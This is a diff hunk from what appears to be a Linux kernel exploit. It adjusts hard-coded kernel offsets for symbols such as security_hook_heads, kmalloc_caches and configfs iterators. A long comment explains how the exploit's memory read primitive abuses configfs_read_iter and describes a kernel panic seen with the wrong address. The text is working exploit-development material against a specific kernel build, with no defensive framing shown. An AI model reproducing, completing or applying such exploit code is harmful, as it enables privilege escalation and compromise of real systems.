@@ -146,7 +146,22 @@
 #define SECURITY_HOOK_HEADS_OFF 0x0168e2f0ULL
 #define KMALLOC_CACHES_OFF     0x0168de30ULL
 #define ANON_PIPE_BUF_OPS_OFF  0x0117f188ULL
-#define CONFIGFS_READ_ITER_OFF      0x0049fc10ULL
+/* The *plain* configfs_read_iter, not configfs_bin_read_iter. The read
+ * primitive plants buffer->page and clears needs_read_fill, which is the plain
+ * one's contract; the bin one copies from bin_buffer/bin_buffer_size, which
+ * that blob leaves at zero, and reaches to_frag(file) unconditionally at +0x3c
+ * -- above its own mutex_lock -- through a dentry whose d_fsdata is a tmpfs
+ * directory index rather than a configfs_dirent.
+ *
+ * Which symbol is which was read out of this image's own tables:
+ *
+ *   configfs_file_operations     @ image 0x118a4c0  read_iter 0x0049f8ec
+ *   configfs_bin_file_operations @ image 0x118a5c8  read_iter 0x0049fc10
+ *
+ * and the bin address is what a run with it panicked at, to the byte:
+ * configfs_bin_read_iter+0x3c faulting on 0x96, i.e. index 70 + the 0x50 that
+ * is offsetof(struct configfs_dirent, s_frag). */
+#define CONFIGFS_READ_ITER_OFF      0x0049f8ecULL
 #define CONFIGFS_BIN_WRITE_ITER_OFF 0x0049fe18ULL
 #define COPY_SPLICE_READ_OFF   0x004235e0ULL
 #define NOOP_LLSEEK_OFF        0x003d6340ULL
